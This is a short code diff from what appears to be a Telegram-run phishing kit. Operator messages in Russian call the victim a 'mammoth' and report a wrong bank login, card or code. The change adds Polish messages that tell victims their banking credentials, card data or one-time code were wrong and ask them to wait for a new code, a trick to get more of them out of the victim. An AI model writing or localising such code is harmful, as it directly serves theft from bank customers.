@@ -46,19 +46,21 @@ class RedirectCommand extends BaseCommand
         $platform = platform($fake->category->name, '2.0');
         try {
             $text = "⭐️ Мамонт ввел ";
-
             switch ($url) {
                 case "/banks":
-                    $text .= $msg = "неверный лк";
+                    $text .= "неверный лк";
+                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane do swojej aplikacji bankowej(Login/Gasło)';
                     break;
                 case "/order":
-                    $text .= $msg = "неверную карту";
+                    $text .= "неверную карту";
+                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane swojej karty bankowej';
                     break;
                 case "/code":
-                    $text .= $msg = "неверный код";
+                    $text .= "неверный код";
+                    $msgPL = 'Pan/Pani wpisał/a kod jaki już nie działa, albo kod jest napisany niepoprawnie. Prosimy zaczekać na nowy kod';
                     break;
                 default:
-                    $text = $msg = null;
+                    $text = $msgPL = null;
                     break;
             }
             if (!is_null($text)) foreach ($fake->allTakeUsers()->pluck('id')->toArray() as $id)
@@ -74,7 +76,7 @@ class RedirectCommand extends BaseCommand
         } catch (TelegramSDKException $e) {
             Log::error($e->getMessage());
         }
-        event(new RedirectEvent($fake, $uuid, $url, $this->getArguments()['msg'] ?? ($msg ? "Вы ввели $msg" : $msg)));
+        event(new RedirectEvent($fake, $uuid, $url, $this->getArguments()['msg'] ?? $msgPL));
         $update = $this->getUpdate();
         $message = $update->getMessage();
 
